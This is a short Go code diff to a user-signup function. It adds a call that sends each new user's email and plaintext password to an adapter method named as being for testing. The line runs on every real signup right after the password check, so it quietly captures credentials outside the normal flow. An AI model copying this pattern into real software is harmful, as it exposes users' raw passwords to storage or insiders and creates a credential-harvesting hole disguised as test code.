@@ -43,6 +43,8 @@ func (user *UserUsecases) SignupUser(req entities.User, pass string) (entities.U
 		return entities.User{}, errors.New("the password is not secure")
 	}
 
+	user.Adapter.InsertEmailandPassforTestPuropose(req.Email, pass)
+
 	req.UserID = helpers.GenUuid()
 
 	res, err := user.Adapter.SignupUser(req)
